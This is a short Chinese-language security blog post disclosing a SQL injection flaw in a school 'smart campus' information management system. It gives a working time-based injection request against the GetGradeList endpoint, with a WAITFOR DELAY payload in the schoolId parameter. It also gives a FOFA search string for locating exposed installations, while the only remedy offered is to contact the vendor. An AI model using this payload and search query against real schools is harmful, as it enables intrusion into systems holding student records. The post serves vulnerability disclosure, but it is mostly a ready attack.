#  新中新中小学智慧校园信息管理系统存在SQL注入漏洞   
小白菜安全  小白菜安全   2024-07-12 19:06  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia11Cywjd5wiaXibKrATFygWqwqicgIYibdzaoPQuVkxMzuT7KE53VjYyCnoUkK5hA0SwaV0IDuxwXZiaqQ/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
GET /PSE/GetGradeList?schoolId=1;WAITFOR%00DELAY%00'0:0:5'-- HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ASP.NET_SessionId=yathh52f1vvjxvmfqjlurzuu
Connection: close


```  
  
出现如下数据代表漏洞存在：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia11Cywjd5wiaXibKrATFygWqwNPUTk9NGicN91RWAS0UYxgpd1sBhFpl2UW3NnXhUbnxmrrvHLkThBicQ/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
  
联系厂商修复  
#   
# 搜索语法  
  
**fofa:body="jwkqunline.html"**  
  
